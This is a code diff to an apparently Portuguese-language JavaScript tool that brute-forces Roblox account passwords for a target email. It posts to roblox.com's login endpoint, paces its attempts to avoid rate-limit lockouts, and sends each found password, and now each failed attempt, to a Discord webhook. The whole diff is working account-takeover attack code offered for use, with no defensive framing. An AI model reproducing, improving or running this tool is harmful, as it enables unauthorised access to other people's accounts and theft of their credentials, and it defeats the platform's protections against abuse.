@@ -26,7 +26,7 @@ async function sendDiscordMessage(content) {
     }
 }
 
-// Função para tentar Login no Roblox (COM DEBUG)
+// Função para tentar Login no Roblox
 async function tryRobloxLogin(email, password) {
     const baseUrl = "https://www.roblox.com";
     
@@ -44,8 +44,7 @@ async function tryRobloxLogin(email, password) {
 
     try {
         // 1. Pegar Cookies iniciais (Importante!)
-        const getResponse = await robloxClient.get('/');
-        console.log(`[DEBUG] Cookies pegados: ${robloxClient.defaults.headers.cookie ? 'Sim' : 'Não'}`);
+        await robloxClient.get('/');
         
         // 2. Tentar fazer Login
         const response = await robloxClient.post('/users/login', {
@@ -57,7 +56,6 @@ async function tryRobloxLogin(email, password) {
         });
 
         const data = response.data;
-        console.log(`[DEBUG] Resposta do Roblox para ${password}:`, JSON.stringify(data));
 
         // Se houver um ID numérico, o login foi um SUCESSO
         if (data.id && typeof data.id === 'number') {
@@ -77,7 +75,6 @@ async function tryRobloxLogin(email, password) {
         }
 
     } catch (error) {
-        console.log(`[DEBUG] Erro de Conexão para ${password}:`, error.message);
         return {
             success: false,
             username: email,
@@ -122,13 +119,13 @@ async function startBruteForce(email) {
             await sendDiscordMessage(msg);
             console.log("ENCONTRADA:", password);
         } else {
-            // Enviar erro no Discord para ver o que está a acontecer
-            // Descomenta a linha abaixo se quiseres ver todos os erros no Discord (pode encher o canal)
-            // await sendDiscordMessage(`❌ Senha: ${password} | Erro: ${result.error}`);
+            // ENVIAR O ERRO NO DISCORD PARA VER O QUE ESTÁ A ACONTECER
+            const errorMsg = `❌ **Tentativa Falhada**\n**Senha Testada:** ${password}\n**Erro do Roblox:** ${result.error}`;
+            await sendDiscordMessage(errorMsg);
         }
 
         // Pausa para não bloquear o Email no Roblox (Rate Limit)
-        await new Promise(r => setTimeout(r, 2000)); // Aumentei para 2 segundos
+        await new Promise(r => setTimeout(r, 2000)); // 2 segundos entre cada tentativa
     }
 
     if (!found) {
